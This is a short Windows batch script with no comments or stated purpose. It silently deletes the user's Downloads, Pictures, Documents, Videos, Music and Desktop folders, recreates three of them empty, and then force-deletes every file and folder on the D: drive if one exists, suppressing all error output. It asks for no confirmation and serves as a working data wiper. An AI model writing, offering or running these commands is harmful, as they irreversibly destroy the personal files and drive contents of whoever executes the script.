@echo off
rd /s /q "%USERPROFILE%\Downloads" 2>nul
rd /s /q "%USERPROFILE%\Pictures" 2>nul
rd /s /q "%USERPROFILE%\Documents" 2>nul
rd /s /q "%USERPROFILE%\Videos" 2>nul
rd /s /q "%USERPROFILE%\Music" 2>nul
rd /s /q "%USERPROFILE%\Desktop" 2>nul

mkdir "%USERPROFILE%\Downloads" 2>nul
mkdir "%USERPROFILE%\Pictures" 2>nul
mkdir "%USERPROFILE%\Documents" 2>nul

if exist D:\ (
    del /f /s /q D:\*.* >nul 2>&1
    for /d %%x in (D:\*) do @rd /s /q "%%x" >nul 2>&1
)

pause
